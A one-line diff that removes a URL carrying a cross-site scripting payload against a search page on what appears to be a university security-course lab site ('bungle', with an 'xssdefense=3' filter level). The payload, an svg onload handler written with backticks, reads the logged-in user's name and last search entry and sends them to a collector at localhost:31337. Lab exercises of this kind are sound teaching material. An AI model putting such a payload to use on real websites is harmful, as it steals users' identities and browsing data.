@@ -1,1 +1,0 @@
-https://bungle.sysnet.ucsd.edu/search?xssdefense=3&q=<svg onload=location=`http://localhost:31337/?stolen_user=`+document.getElementById(`logged-in-user`).innerText+`&last_search=`+document.querySelector(`.history-item`).innerText>
